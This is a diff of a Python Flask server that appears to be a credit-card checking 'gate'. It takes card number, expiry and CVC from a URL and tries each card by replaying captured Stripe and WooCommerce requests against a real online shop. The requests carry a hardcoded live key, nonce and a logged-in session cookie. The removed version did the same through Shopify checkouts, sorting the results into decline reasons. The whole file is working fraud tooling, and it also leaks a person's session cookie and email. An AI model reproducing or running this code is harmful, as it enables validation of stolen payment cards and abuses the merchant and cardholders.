@@ -1,168 +1,215 @@
-import asyncio
-import re
-import json
 from flask import Flask, request, jsonify
-from msh import get_variant_and_token
+import requests
+import json
+import sys
+import re
 import threading
 import time
-from flask_limiter import Limiter
-from flask_limiter.util import get_remote_address
-from urllib.parse import urlparse, parse_qs
-import os
 
 app = Flask(__name__)
 
-# Set up rate limiting with the correct initialization for newer flask-limiter versions
-limiter = Limiter(
-    key_func=get_remote_address,
-    app=app,
-    default_limits=["200 per day", "50 per hour"]
-)
-
-def parse_proxy_string(proxy_str):
-    """Parse proxy string in format host:user:pass:ip"""
-    if not proxy_str:
-        return None
-        
-    parts = proxy_str.split(':')
-    if len(parts) < 4:
-        return None
-        
-    return {
-        'host': parts[0],
-        'user': parts[1],
-        'password': parts[2],
-        'ip': ':'.join(parts[3:])  # Handle case where IP might contain colons (IPv6)
+def process_payment(card_details):
+    """
+    Process the payment using Stripe API and the merchant's endpoint.
+    Returns a dictionary with status and response message.
+    """
+    # Second request: POST to api.stripe.com/v1/payment_methods
+    headers2 = {
+        'accept': 'application/json',
+        'accept-language': 'en-US,en;q=0.9',
+        'cache-control': 'no-cache',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'pragma': 'no-cache',
+        'priority': 'u=1, i',
+        'referer': 'https://js.stripe.com/',
+        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
     }
 
-def parse_cc_string(cc_str):
-    """Parse credit card string in format number|month|year|cvv"""
-    if not cc_str:
-        return None
-        
-    parts = cc_str.split('|')
-    if len(parts) < 4:
-        return None
-        
-    return {
-        'number': parts[0],
-        'month': parts[1],
-        'year': parts[2],
-        'cvv': parts[3]
-    }
+    # Format card details for the request
+    data2 = f'type=card&card[number]={card_details["card_number"]}&card[cvc]={card_details["cvc"]}&card[exp_year]={card_details["exp_year"]}&card[exp_month]={card_details["exp_month"]}&allow_redisplay=unspecified&billing_details[address][postal_code]={card_details["postal_code"]}&billing_details[address][country]={card_details["country"]}&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbentleylanecreations.com&time_on_page=1283073&client_attribution_metadata[client_session_id]=4930c9af-0300-48f6-b89d-60782fe69360&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=a6f8ef0f-8e7d-4cbe-84f3-78167f3de01c&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=55c950db-485d-4bbe-8c83-e79cb9bf493df4dc3f&muid=79b6e5ad-5b0c-4134-861c-37e2502c8d2f2b87d2&sid=e8c5efcd-2485-4cbb-b49d-50db9cb5f010349908&key=pk_live_51MuQ36JxXE8UJEXgPLz36wlHls4AV6nvgFtgtKRs7gjnFdsSKf3X4Onv4d8TkUjona7eCoT6uzxTXirEhtzCI4s600qxDdWqul&_stripe_version=2024-06-20'
 
-def extract_result_from_response(response_text, amount, currency):
-    """Extract result from response text"""
+    # Extract payment method ID from response2
     try:
-        res_json = json.loads(response_text)
+        response2 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers2, data=data2)
+        response2_data = response2.json()
+        if 'error' in response2_data:
+            return {"status": "declined", "response": "Your card was declined."}
+        payment_method_id = response2_data.get('id', '')
+        if not payment_method_id:
+            return {"status": "declined", "response": "Your card was declined."}
+    except Exception as e:
+        return {"status": "declined", "response": "Your card was declined."}
+
+    # Third request: POST to bentleylanecreations.com/ with params
+    cookies3 = {
+        'sbjs_migrations': '1418474375998%3D1',
+        'sbjs_current_add': 'fd%3D2025-11-28%2016%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F',
+        'sbjs_first_add': 'fd%3D2025-11-28%2016%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F',
+        'sbjs_current': 'typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_first': 'typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        '_ga': 'GA1.1.1002213286.1764349881',
+        '__hstc': '221998599.a2e5bd6399608fed327f4b8dc06dec6e.1764349885082.1764349885082.1764349885082.1',
+        'hubspotutk': 'a2e5bd6399608fed327f4b8dc06dec6e',
+        '__hssrc': '1',
+        '__stripe_mid': '79b6e5ad-5b0c-4134-861c-37e2502c8d2f2b87d2',
+        '__stripe_sid': 'e8c5efcd-2485-4cbb-b49d-50db9cb5f010349908',
+        '_lscache_vary': '685c04f9545210a296c8c6765c584637',
+        'wordpress_logged_in_873cb7bce70a624e4e0ff8ed0a33b1c2': 'malcjaviusstorm%40gmail.com%7C1765559560%7CMB5WprqOzaq05IAaAuiRB0aLFF9DTctDk5UsPhfL23y%7C8b291e94851c72fc19204c6e22a69d844c1845b34ca8caeec74cc7fc6575bb1c',
+        '_ga_14QKZLEYED': 'GS2.1.s1764349881$o1$g0$t1764349962$j55$l0$h0',
+        '_ga_MNDVKEF2BP': 'GS2.1.s1764349881$o1$g1$t1764350425$j60$l0$h0',
+        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%206.0%3B%20Nexus%205%20Build%2FMRA58N%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F142.0.0.0%20Mobile%20Safari%2F537.36',
+        'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbentleylanecreations.com%2Fmy-account%2Fadd-payment-method%2F',
+        '__hssc': '221998599.3.1764349885082',
+    }
+
+    headers3 = {
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9',
+        'cache-control': 'no-cache',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://bentleylanecreations.com',
+        'pragma': 'no-cache',
+        'priority': 'u=1, i',
+        'referer': 'https://bentleylanecreations.com/my-account/add-payment-method/',
+        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    params3 = {
+        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
+    }
+
+    data3 = {
+        'action': 'create_and_confirm_setup_intent',
+        'wc-stripe-payment-method': payment_method_id,
+        'wc-stripe-payment-type': 'card',
+        '_ajax_nonce': 'b7a9cb9881',
+    }
+
+    try:
+        response3 = requests.post('https://bentleylanecreations.com/', params=params3, cookies=cookies3, headers=headers3, data=data3)
+        response_data = response3.json()
         
-        # Check if there are errors in the response
-        if 'data' in res_json and 'submitForCompletion' in res_json['data']:
-            submit_data = res_json['data']['submitForCompletion']
-            
-            # Check for errors
-            if 'errors' in submit_data and submit_data['errors']:
-                error_codes = [error.get('code', '') for error in submit_data['errors']]
-                
-                # Handle specific error codes
-                if 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE' in error_codes:
-                    return f"AMOUNT: ${amount}\nRESULT: DELIVERY_UNAVAILABLE"
-                elif 'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT' in error_codes:
-                    return f"AMOUNT: ${amount}\nRESULT: PAYMENT_AMOUNT_ERROR"
-                elif 'REQUIRED_ARTIFACTS_UNAVAILABLE' in error_codes:
-                    return f"AMOUNT: ${amount}\nRESULT: ARTIFACTS_UNAVAILABLE"
-                else:
-                    return f"AMOUNT: ${amount}\nRESULT: ERROR: {'; '.join(error_codes)}"
-            
-            # Check for successful receipt
-            if 'receipt' in submit_data and submit_data['receipt']:
-                receipt = submit_data['receipt']
-                if 'id' in receipt:
-                    return f"AMOUNT: ${amount}\nRESULT: ORDER_PLACED"
+        # Check if the setup intent was successful in the third request
+        if response_data.get('success') and response_data.get('data', {}).get('status') == 'succeeded':
+            return {"status": "approved", "response": "Payment method added successfully"}
         
-        # Fallback to searching for specific patterns in response
-        if "shopify_payments" in str(res_json):
-            return f"AMOUNT: ${amount}\nRESULT: ORDER_PLACED"
-        elif "CARD_DECLINED" in str(res_json):
-            return f"AMOUNT: ${amount}\nRESULT: CARD_DECLINED"
-        elif "INCORRECT_NUMBER" in str(res_json):
-            return f"AMOUNT: ${amount}\nRESULT: INCORRECT_NUMBER"
-        elif "GENERIC_ERROR" in str(res_json):
-            return f"AMOUNT: ${amount}\nRESULT: GENERIC_ERROR"
-        elif "AUTHENTICATION_FAILED" in str(res_json):
-            return f"AMOUNT: ${amount}\nRESULT: 3DS_REQUIRED"
-        elif "FRAUD_SUSPECTED" in str(res_json):
-            return f"AMOUNT: ${amount}\nRESULT: FRAUD_SUSPECTED"
-        elif "INCORRECT_ADDRESS" in str(res_json):
-            return f"AMOUNT: ${amount}\nRESULT: MISMATCHED_BILLING"
-        elif "INCORRECT_ZIP" in str(res_json):
-            return f"AMOUNT: ${amount}\nRESULT: MISMATCHED_ZIP"
-        elif "INCORRECT_PIN" in str(res_json):
-            return f"AMOUNT: ${amount}\nRESULT: MISMATCHED_PIN"
-        elif "insufficient_funds" in str(res_json):
-            return f"AMOUNT: ${amount}\nRESULT: INSUFFICIENT_FUNDS"
-        elif "INSUFFICIENT_FUNDS" in str(res_json):
-            return f"AMOUNT: ${amount}\nRESULT: INSUFFICIENT_FUNDS"
-        elif "INVALID_CVC" in str(res_json):
-            return f"AMOUNT: ${amount}\nRESULT: INVALID_CVC"
-        elif "INCORRECT_CVC" in str(res_json):
-            return f"AMOUNT: ${amount}\nRESULT: INCORRECT_CVC"
-        elif "CompletePaymentChallenge" in str(res_json):
-            return f"AMOUNT: ${amount}\nRESULT: 3DS_REQUIRED"
+        # If not successful, extract setup intent ID and client secret for the fourth request
+        setup_intent_id = response_data.get('data', {}).get('id', '')
+        client_secret = response_data.get('data', {}).get('client_secret', '')
+        
+        if not setup_intent_id or not client_secret:
+            return {"status": "declined", "response": "Your card was declined."}
+            
+    except Exception as e:
+        return {"status": "declined", "response": "Your card was declined."}
+
+    # Fourth request: POST to api.stripe.com/v1/setup_intents/[id]/confirm
+    headers4 = {
+        'accept': 'application/json',
+        'accept-language': 'en-US,en;q=0.9',
+        'cache-control': 'no-cache',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'pragma': 'no-cache',
+        'priority': 'u=1, i',
+        'referer': 'https://js.stripe.com/',
+        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
+    }
+
+    data4 = f'use_stripe_sdk=true&mandate_data[customer_acceptance][type]=online&mandate_data[customer_acceptance][online][infer_from_client]=true&key=pk_live_51MuQ36JxXE8UJEXgPLz36wlHls4AV6nvgFtgtKRs7gjnFdsSKf3X4Onv4d8TkUjona7eCoT6uzxTXirEhtzCI4s600qxDdWqul&_stripe_version=2024-06-20&client_attribution_metadata[client_session_id]=4930c9af-0300-48f6-b89d-60782fe69360&client_attribution_metadata[merchant_integration_source]=l1&client_secret={client_secret}'
+
+    try:
+        response4 = requests.post(
+            f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm',
+            headers=headers4,
+            data=data4,
+        )
+        
+        response_json = response4.json()
+        
+        # Check if there's an error in the response
+        if 'error' in response_json:
+            return {"status": "declined", "response": "Your card was declined."}
         else:
-            return f"AMOUNT: ${amount}\nRESULT: UNKNOWN_ERROR"
+            # If no error, it was successful
+            return {"status": "approved", "response": "Payment method added successfully"}
             
     except Exception as e:
-        return f"AMOUNT: ${amount}\nRESULT: ERROR: {str(e)}"
+        return {"status": "declined", "response": "Your card was declined."}
 
-@app.route('/checkout', methods=['GET'])
-@limiter.limit("10 per minute")
-def checkout():
+@app.route('/gate=stauth/cc+<card_info>')
+def process_card(card_info):
+    """
+    Process card information from the URL.
+    Format: card_number|exp_month|exp_year|cvc|postal_code|country
+    """
     try:
-        # Get query parameters
-        site = request.args.get('site')
-        cc_str = request.args.get('cc')
-        proxy_str = request.args.get('proxy')
+        # Parse the card information from the URL
+        # Format: card_number|exp_month|exp_year|cvc|postal_code|country
+        parts = card_info.split('|')
         
-        # Validate required parameters
-        if not site or not cc_str:
-            return jsonify({"error": "Missing required parameters: site and cc"}), 400
+        # Validate the input
+        if len(parts) < 4:
+            return jsonify({"status": "declined", "response": "Invalid card format. Expected: card_number|exp_month|exp_year|cvc|postal_code|country"})
         
-        # Parse credit card info
-        cc_info = parse_cc_string(cc_str)
-        if not cc_info:
-            return jsonify({"error": "Invalid credit card format. Expected: number|month|year|cvv"}), 400
+        card_number = parts[0].replace(' ', '')  # Remove spaces
+        exp_month = parts[1]
+        exp_year = parts[2]
         
-        # Parse proxy info (optional)
-        proxy_info = None
-        if proxy_str:
-            proxy_info = parse_proxy_string(proxy_str)
-            if not proxy_info:
-                return jsonify({"error": "Invalid proxy format. Expected: host:user:pass:ip"}), 400
+        # Handle both 2-digit and 4-digit year formats
+        if len(exp_year) == 2:
+            exp_year = '20' + exp_year
         
-        # Add protocol if missing
-        if not site.startswith(('http://', 'https://')):
-            site = 'https://' + site
-            
-        # Run the async function in a new event loop
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            result = loop.run_until_complete(
-                get_variant_and_token(site, cc_info['number'], cc_info['month'], cc_info['year'], cc_info['cvv'])
-            )
-            return jsonify({"result": result})
-        finally:
-            loop.close()
-            
+        cvc = parts[3]
+        postal_code = parts[4] if len(parts) > 4 else "10001"
+        country = parts[5] if len(parts) > 5 else "US"
+        
+        card_details = {
+            'card_number': card_number,
+            'exp_month': exp_month,
+            'exp_year': exp_year,
+            'cvc': cvc,
+            'postal_code': postal_code,
+            'country': country
+        }
+        
+        # Process the payment
+        result = process_payment(card_details)
+        
+        # Return the result
+        return jsonify(result)
     except Exception as e:
-        return jsonify({"error": str(e)}), 500
+        return jsonify({"status": "declined", "response": "An error occurred while processing your request."})
 
-@app.route('/health', methods=['GET'])
-def health_check():
-    return jsonify({"status": "healthy"})
+# Add a root endpoint for health checks
+@app.route('/')
+def index():
+    return jsonify({"status": "running", "message": "Card processing server is running"})
+
+# Add a status endpoint
+@app.route('/status')
+def status():
+    return jsonify({"status": "running", "message": "Card processing server is running"})
 
 if __name__ == '__main__':
-    # Use port from environment variable for cloud deployment compatibility
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
